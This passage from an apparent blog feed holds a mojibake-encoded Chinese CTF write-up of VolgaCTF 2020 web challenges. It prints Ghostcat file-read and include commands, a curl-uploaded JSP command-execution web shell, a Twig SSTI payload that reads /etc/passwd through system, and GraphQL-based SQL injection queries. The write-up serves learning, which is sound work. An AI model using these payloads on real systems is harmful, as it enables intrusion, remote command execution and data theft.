      <link href="2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›æ²¡æœ‰æ€ä¹ˆè®¤çœŸæ‰“ï¼Œä½†æ˜¯æ¯•ç«Ÿé¢˜è¿˜æ˜¯çœ‹äº†çš„ã€‚é™¤äº†å¹½çµçŒ«ä»¥å¤–çš„é¢˜ä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå¥½å¥½å­¦ä¹ ä¸€æ³¢ã€‚</p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>è¿™ä¸ªå‘¨æœ«æœ€å¤§çš„æ”¶è·å°±æ˜¯åšäº†å‡ é“javaé¢˜ï¼Œå¯¹javaé¢˜çš„ç›¸å…³å¥—è·¯æœ‰äº†ä¸€å®šäº†è§£ã€‚<br>æ¯”å¦‚æ­¤é¢˜ï¼Œå¼€å§‹ä¸Šæ¥é¡µé¢å¹¶æ— ä»»ä½•æœ‰ç”¨ä¿¡æ¯ã€‚å”¯ä¸€èƒ½åšçš„ä»è·¯ç”±ä¸‹æ‰‹ï¼Œè¿™é‡Œä¸ä½¿ç”¨è·¯å¾„çˆ†ç ´å·¥å…·çš„è¯ï¼Œå¯ä»¥é€šè¿‡æ„é€ ä¸€äº›é”™è¯¯è·¯å¾„æ¥å°è¯•çˆ†ç‰ˆæœ¬ä»¥åŠçˆ†æœåŠ¡ã€‚è¿™é‡Œåœ¨bpé€šè¿‡æ„é€ çˆ†å‡ºäº†tomcatæœåŠ¡çš„ç›¸å…³ä¿¡æ¯ã€‚</p><a id="more"></a><p>è€Œä¸”è®¿é—®<code>/docs</code>ï¼Œå¾—åˆ°apachetomcatä¿¡æ¯,æ˜¯9.0.24ç‰ˆæœ¬ã€‚åŸºæœ¬ç¡®å®šæ˜¯é“javaé¢˜ï¼Œ<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å»æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°äº†è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼š<br>CVE-2020-1938 å³tomcatçš„ghostcatæ¼æ´<br>å€¼å¾—ä¸€æçš„æ˜¯,ghostcatæ¼æ´æ˜¯ç”±é•¿äº­çˆ†å‡ºæ¥çš„æ´ï¼ŒGhostCat ä¸»è¦æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–å’ŒåŒ…å«æ¼æ´<br>å½±å“èŒƒå›´å¾ˆå¹¿ï¼Œå‡ ä¹å›Šæ‹¬äº†6-9ç‰ˆæœ¬ã€‚<br>æˆ‘ä»¬åˆçŸ¥é“ï¼Œæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«=RCE.å› æ­¤å°è¯•åˆ©ç”¨ç›¸å…³å·¥å…·å…ˆè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œçœ‹çœ‹æœ‰æ— æ”¶è·ã€‚<br>å¼€å§‹ç”¨çš„expæ˜¯è¿™ä¸ª<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a>,ä½†æ˜¯åªèƒ½è¯»æ–‡ä»¶ä¸å¯æ‰§è¡Œå‘½ä»¤ã€‚å› æ­¤ä½œç½¢ã€‚<br>æˆ‘åæ¥ä½¿ç”¨çš„expæ¥è‡ª<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a><br>è¿™ä¸ªexpä¸ä»…å¯ä»¥æ–‡ä»¶è¯»å–è¿˜å¯ä»¥åŒ…å«ï¼Œå› æ­¤æ›´é€‚åˆ</p><p>é¦–å…ˆ,å¯¹tomcatæœåŠ¡å¿…è¯»çš„æ–‡ä»¶å°±æ˜¯<code>WEB-INF/web.xml</code><br>å°è¯•è¯»å–<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru  8009  /WEB-INF/web.xml read</code></p><pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;        &lt;servlet&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;                &lt;description&gt;Complaint info&lt;/description&gt;                &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;        &lt;/servlet&gt;        &lt;servlet-mapping&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;        &lt;/servlet-mapping&gt;        &lt;error-page&gt;                &lt;error-code&gt;404&lt;/error-code&gt;                &lt;location&gt;/404.html&lt;/location&gt;        &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°é™¤äº†404.htmlè¿™æ ·çš„é¡µé¢è¿˜æœ‰ä¸¤ä¸ªç±»çš„ä¿¡æ¯ã€‚è¿™é‡Œå¯ä»¥æ¨æ–­classæ–‡ä»¶çš„è·¯å¾„,é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç <br>æˆ‘æŒ‰ç…§roarctf easyjavaçš„ç»éªŒæ„é€ è·¯å¾„,è·¯å¾„å‹‰å¼ºç®—ç†è§£ï¼Œå¥½æ­¹æˆ‘ä¹Ÿæ˜¯javaå…¥é—¨ç¼–ç¨‹çš„â€¦<code>WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class</code>ï¼Œå¦ä¸€ä¸ªåŒç†ã€‚</p><pre><code> python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class read -o complaint.class python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read -o screenshoot.class</code></pre><p>åç¼–è¯‘åå¾—åˆ°ä»¥ä¸‹æºç </p><pre><code class="java">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name:   ServeComplaintServlet.javapackage ru.volgactf.netcorp;import java.io.IOException;import java.io.PrintStream;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.http.*;public class ServeComplaintServlet extends HttpServlet{    public ServeComplaintServlet()    {        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);    }    public void init(ServletConfig config)        throws ServletException    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);    }    public void destroy()    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);    }    protected void doGet(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)        throws ServletException, IOException    {    }    protected void doPost(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)        throws ServletException, IOException    {    }    private static final long serialVersionUID = 1L;    private static final String SAVE_DIR = &quot;uploads&quot;;}</code></pre><pre><code class="java">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name:   ServeScreenshotServlet.javapackage ru.volgactf.netcorp;import java.io.*;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Collection;import java.util.Iterator;import javax.servlet.*;import javax.servlet.http.*;public class ServeScreenshotServlet extends HttpServlet{    public ServeScreenshotServlet()    {        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);    }    public void init(ServletConfig config)        throws ServletException    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);    }    public void destroy()    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);    }    protected void doPost(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        String appPath = request.getServletContext().getRealPath(&quot;&quot;);        String savePath = (new StringBuilder()).append(appPath).append(&quot;uploads&quot;).toString();        File fileSaveDir = new File(savePath);        if(!fileSaveDir.exists())            fileSaveDir.mkdir();        String submut = request.getParameter(&quot;submit&quot;);        if(submut != null)            if(submut.equals(&quot;true&quot;));        PrintWriter out = request.getParts().iterator();        do        {            if(!out.hasNext())                break;            Part part = (Part)out.next();            String fileName = extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = generateFileName(fileName);            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();            if(!path.equals(&quot;Error&quot;))                part.write(path);        } while(true);        out = response.getWriter();        response.setContentType(&quot;application/json&quot;);        response.setCharacterEncoding(&quot;UTF-8&quot;);        out.print(String.format(&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;, new Object[] {            &quot;true&quot;        }));        out.flush();    }    private String generateFileName(String fileName)    {        String s2;        StringBuilder sb;        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);        md.update(fileName.getBytes());        byte digest[] = md.digest();        s2 = (new BigInteger(1, digest)).toString(16);        sb = new StringBuilder(32);        int i = 0;        for(int count = 32 - s2.length(); i &lt; count; i++)            sb.append(&quot;0&quot;);        return sb.append(s2).toString();        NoSuchAlgorithmException e;        e;        e.printStackTrace();        return &quot;Error&quot;;    }    private String extractFileName(Part part)    {        String contentDisp = part.getHeader(&quot;content-disposition&quot;);        String items[] = contentDisp.split(&quot;;&quot;);        String as[] = items;        int i = as.length;        for(int j = 0; j &lt; i; j++)        {            String s = as[j];            if(s.trim().startsWith(&quot;filename&quot;))                return s.substring(s.indexOf(&quot;=&quot;) + 2, s.length() - 1);        }        return &quot;&quot;;    }    private static final String SAVE_DIR = &quot;uploads&quot;;}</code></pre><p>ä¸»è¦å†…å®¹åœ¨äº<code>ServeScreenshotServlet</code>è¿™ä¸ªç±»ã€‚æˆ‘ä»¬å¾—åˆ°äº†ä¸Šä¼ æ–‡ä»¶çš„å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ä¸Šä¼ +åŒ…å«æ„é€ RCEäº†ã€‚<br>ç®€å•è¯»ä¸‹æºç ï¼Œå…¶å®å°±æ˜¯æŒ‡ä¸Šä¼ æ–‡ä»¶ä¼šä¼ åˆ°<code>/upload</code>ä¸‹ï¼ŒåŒæ—¶æ–‡ä»¶åå˜ä¸ºä¸Šä¼ æ–‡ä»¶åçš„md5å€¼<br>ç›´æ¥ä½¿ç”¨curlä¼ æ–‡ä»¶<br><code>curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot</code><br>myexp.jsp</p><pre><code class="Javascript">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% out.println(&quot;Executing command&quot;);Process p = Runtime.getRuntime().exec(&quot;ls&quot;);OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {  out.println(disr);   disr = dis.readLine(); }%&gt;</code></pre><p>æ‰§è¡Œ<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval</code><br><img src="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„åˆ°flag.txtçš„å­˜åœ¨,é‚£ä¹ˆç›´è§£æ›´æ”¹å‘½ä»¤ä¸Šä¼ åå†æ¬¡æ‰§è¡Œå³å¯</p><p><img src="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h2><p>è¿™é¢˜ç½‘ä¸Šæ‰¾ä¸åˆ°å…è´¹çš„èƒ½æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼Œåº”è¯¥æ˜¯è¦ä¸ªSMTPçš„ã€‚æ²¡åŠæ³•åªèƒ½å­¦å­¦Twigæ‰“sstiçš„ç”¨æ³•äº†ã€‚<br>é¢˜ç›®é¦–å…ˆç»™å‡ºçœ‹æºç </p><pre><code class="php">&lt;?phpnamespace App\Controller;use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;use Symfony\Component\HttpFoundation\Response;use Symfony\Component\HttpFoundation\Request;use Symfony\Component\Mailer\MailerInterface;use Symfony\Component\Mime\Email;class MainController extends AbstractController{    public function index(Request $request)    {      return $this-&gt;render(&#39;main.twig&#39;);    }    public function subscribe(Request $request, MailerInterface $mailer)    {      $msg = &#39;&#39;;      $email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);      if($email !== FALSE) {        $name = substr($email, 0, strpos($email, &#39;@&#39;));        $content = $this-&gt;get(&#39;twig&#39;)-&gt;createTemplate(          &quot;&lt;p&gt;Hello ${name}.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;        )-&gt;render();        $mail = (new Email())-&gt;from(&#39;newsletter@newsletter.q.2020.volgactf.ru&#39;)-&gt;to($email)-&gt;subject(&#39;VolgaCTF Newsletter&#39;)-&gt;html($content);        $mailer-&gt;send($mail);        $msg = &#39;Success&#39;;      } else {        $msg = &#39;Invalid email&#39;;      }      return $this-&gt;render(&#39;main.twig&#39;, [&#39;msg&#39; =&gt; $msg]);    }    public function source()    {        return new Response(&#39;&lt;pre&gt;&#39;.htmlspecialchars(file_get_contents(__FILE__)).&#39;&lt;/pre&gt;&#39;);    }}</code></pre><p>é¦–å…ˆä¸ç”¨è¯´ï¼Œ<code>${name}</code>è¿™é‡Œå­˜åœ¨sstiçš„ã€‚åŒæ—¶ç¡®è®¤æ˜¯twigæ¨¡æ¿çš„ã€‚<br><code>$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);</code><br>è¿™å¥è¿‡æ»¤å¾ˆå¥½ç»•ï¼Œåªéœ€è¦<code>6@domain.tld</code>å°±å¯ä»¥åœ¨æ”¶æ¸…æ±‚çš„åœ°æ–¹çœ‹åˆ°sstiçš„æ•ˆæœäº†ã€‚<br>flagåœ¨etc/passwdä¸­<br>payload:</p><pre><code>&quot;{{['cat${IFS}/etc/passwd']|filter('system')}}&quot;@y</code></pre><p>å› ä¸ºæ²¡æ³•äº²è‡ªåŠ¨æ‰‹æ‰€ä»¥åªå¥½æ¬è¿payloadäº†ï¼Œæƒ­æ„§â€¦</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>åœ¨æ³¨å†Œæ—¶å¯ä»¥æŠ“åŒ…å‘ç°/apiçš„è·¯ç”±<br><img src="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ®ä¼ è¾“åŠè¿”å›å½¢å¼ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ˜¯GrpahQLçš„apiæ¥å£,åŒæ—¶ä¹Ÿæœ‰ä¸ªç»å…¸çš„åˆ©ç”¨ï¼Œå°±æ˜¯ä¼ <code>{__schema{types{name}}}</code>,å¯ä»¥é€šè¿‡__schemaæŸ¥è¯¢æ‰€æœ‰å¯ç”¨å¯¹è±¡ï¼š<br>å°è¯•ç›´æ¥è®¿é—®æ— æœï¼Œpostä¼ å€¼<code>{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}</code><br>(è¿™é‡Œè¦ç¨å¾®æ ¹æ®ä¹‹å‰ä¼ å€¼çš„æ–¹å¼æ„é€ ä¸€ä¸‹)</p><pre><code class="json">{&quot;data&quot;:{&quot;__schema&quot;:{&quot;types&quot;:[{&quot;name&quot;:&quot;Query&quot;},{&quot;name&quot;:&quot;String&quot;},{&quot;name&quot;:&quot;LoginUser&quot;},{&quot;name&quot;:&quot;LoginResponse&quot;},{&quot;name&quot;:&quot;UserFilter&quot;},{&quot;name&quot;:&quot;User&quot;},{&quot;name&quot;:&quot;Book&quot;},{&quot;name&quot;:&quot;Mutation&quot;},{&quot;name&quot;:&quot;RegisterUser&quot;},{&quot;name&quot;:&quot;__Schema&quot;},{&quot;name&quot;:&quot;__Type&quot;},{&quot;name&quot;:&quot;__TypeKind&quot;},{&quot;name&quot;:&quot;Boolean&quot;},{&quot;name&quot;:&quot;__Field&quot;},{&quot;name&quot;:&quot;__InputValue&quot;},{&quot;name&quot;:&quot;__EnumValue&quot;},{&quot;name&quot;:&quot;__Directive&quot;},{&quot;name&quot;:&quot;__DirectiveLocation&quot;}]}}}</code></pre><p>ä½¿ç”¨å¦‚ä¸‹payloadå¯ä»¥ä¸€ä¸ªä¸ªçš„çˆ†å‡ºæˆ‘ä»¬å¯èƒ½å¯ä»¥åˆ©ç”¨çš„schemaçš„ä¿¡æ¯<br><code>{&quot;query&quot;:&quot;{ __type(name: \&quot;User\&quot;) { name fields { name type { name kind }}}}&quot;}</code></p><pre><code class="json">{&quot;data&quot;:{&quot;__type&quot;:{&quot;name&quot;:&quot;User&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;name&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;email&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}}]}}}</code></pre><p>è¿™å°±å‘Šè¯‰æˆ‘ä»¬ï¼ŒUser objectæœ‰ä¸‰ä¸ªField.login, name ,email.åŒç†æˆ‘ä»¬çˆ†ä¸‹å…¶ä»–çš„,æ¯”å¦‚é‡ç‚¹å…³æ³¨çš„Query<br>å›æ˜¾ï¼š</p><pre><code>{&quot;data&quot;:{&quot;__type&quot;:{&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;}},{&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:{&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;}},{&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:{&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;}}]}}}</code></pre><p>å‘ç°ä¸€ä¸ªtestGetUsersByFilter,ä¼¼ä¹å¾ˆæœ‰æ„æ€ã€‚ä¹Ÿè®¸å®ƒå¯¹å¯æ³¨çš„ç‚¹è¿›è¡Œäº†è¿‡æ»¤,ä½†è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚<br>äºæ˜¯æˆ‘ä»¬è¿›è¡ŒåŸºæœ¬çš„æŸ¥è¯¢ã€‚æ­¤æ—¶ç›®æ ‡åº”è¯¥æ˜¯sqlæ³¨å…¥ï¼Œå¯»æ‰¾å¯æ³¨ç‚¹ã€‚</p><pre><code class="json">{&quot;query&quot;:&quot;query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n  login email name \n  }\n}\n&quot;,&quot;variables&quot;:{&quot;input&quot;:{&quot;login&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test&quot;,&quot;name&quot;:&quot;test&quot;}}}</code></pre><p>æ„é€ è¿™æ ·ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ã€‚æ­¤æ—¶æˆ‘ä»¬éœ€è¦é€šè¿‡æ§åˆ¶login email,nameçš„å€¼æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</p><pre><code class="json">{&quot;query&quot;:&quot;query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n  login email name \n  }\n}\n&quot;,&quot;variables&quot;:{&quot;input&quot;:{&quot;login&quot;:&quot;&#39;&quot;,&quot;email&quot;:&quot;1231321&quot;,&quot;name&quot;:&quot;3213&quot;}}}</code></pre><p>å½“å°è¯•sqlæ³¨å…¥å¸¸è§çš„å•å¼•å·æ—¶ï¼Œå‘ç°è¿”å›çš„ç»“æœå¯¹åº”çš„loginå±…ç„¶æ˜¯ç©ºçš„ã€‚æ‰€ä»¥çœ‹æ¥å•å¼•å·è¢«è¿‡æ»¤äº†ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ã€‚å› ä¸ºé€ƒé€¸å•å¼•å·ä¹Ÿæ˜¯ä¸ªè€ƒçƒ‚çš„trickäº†ã€‚</p><p>å°†æˆ‘ä»¬ä¼ å‚éƒ¨åˆ†inputçš„å€¼æ”¹ä¸ºï¼š<code>{&quot;login&quot;:&quot;test\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}</code><br>å‘ç°å°†è¿”å›æ‰€æœ‰ç”¨æˆ·åã€‚è‡³æ­¤sqlæ³¨å…¥å·²ç»ç¡®è®¤å¯æ³¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ–æ˜ä¿¡æ¯äº†ã€‚<br>å…ˆorder by æµ‹å­—æ®µæ•°ï¼Œå‘ç°æ˜¯6ä¸ª<br><img src="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ‰§è¡ŒæŸ¥è¯¢ï¼Œå‘ç°å›æ˜¾å­—æ®µæ˜¯2,6,5<br><code>union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#</code><br>å‘ç°flagè¡¨,flagåˆ—ï¼ŒæŸ¥è¯¢å³å¯<br><img src="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF&amp;MRCTFéƒ¨åˆ†webé¢˜è§£</title>
      <link href="2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/"/>
      <url>2020/03/29/WUSTCTF&amp;MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«é¡ºæ‰‹æ‰“äº†ä¸‹ä¸¤ä¸ªæ–°ç”Ÿèµ›ã€‚æœ¬æ¥ä¸æƒ³å†™wpçš„,ä½†æ˜¯æƒ³åˆ°ä¸Šå‘¨BJDæ¯”èµ›çš„wpä¹Ÿæ²¡å†™å°±æƒ³ç€è¿˜æ˜¯è¡¥ç€å§ã€‚ï¼ˆä¸Šå‘¨BJDä¸å†™æ˜¯å› ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›é¢˜ç›®å†™å†™ã€‚å…·ä½“åªå¤§è‡´è®²ä¸‹æ€è·¯å§</p><a id="more"></a><h1 id="WUSTCTF"><a href="#WUSTCTF" class="headerlink" title="WUSTCTF"></a>WUSTCTF</h1><p>å¾ˆæœ‰æ„æ€ï¼Œé¢˜ç›®é‡Œphpéš¾åº¦éƒ½æ¯”è¾ƒåŸºç¡€ã€‚javaéš¾åº¦å°±ä¸ä¸€æ ·äº†ï¼Œä¼°è®¡æ˜¯javaæ¥è§¦çš„å°‘çš„åŸå› å§ã€‚</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>è¿›å»ä¸€ä¸ªå‰ç«¯éªŒè¯ã€‚é™åˆ¶æŒ‰é’®è·Ÿé•¿åº¦ã€‚å‰ç«¯æŠŠæŒ‰é’®è§£å†³åæŠ“ä¸ªåŒ…ä¼ 